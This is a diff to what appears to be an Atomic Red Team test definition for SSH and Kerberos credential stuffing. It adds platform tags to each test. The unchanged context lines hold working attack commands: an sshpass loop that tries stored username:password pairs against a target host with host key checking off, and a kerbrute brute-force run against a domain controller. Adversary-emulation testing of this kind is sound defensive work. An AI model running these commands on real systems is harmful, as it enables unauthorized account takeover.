@@ -32,6 +32,8 @@ atomic_tests:
       cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
+  run_on:
+  - linux
 - name: SSH Credential Stuffing From MacOS
   auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
   description: |
@@ -63,6 +65,8 @@ atomic_tests:
       cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
+  run_on:
+  - macos
 - name: SSH Credential Stuffing From FreeBSD
   auto_generated_guid: a790d50e-7ebf-48de-8daa-d9367e0911d4
   description: |
@@ -83,7 +87,7 @@ atomic_tests:
       Requires SSHPASS
     prereq_command: |
       if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
-      
+
     get_prereq_command: |
       pkg install -y sshpass
 
@@ -94,7 +98,8 @@ atomic_tests:
       cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
-
+  run_on:
+  - freebsd
 - name: Brute Force:Credential Stuffing using Kerbrute Tool
   auto_generated_guid: 4852c630-87a9-409b-bb5e-5dc12c9ebcde
   description: |
@@ -132,3 +137,5 @@ atomic_tests:
     command: |
       cd "PathToAtomicsFolder\..\ExternalPayloads"
       .\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"      
+  run_on:
+  - windows
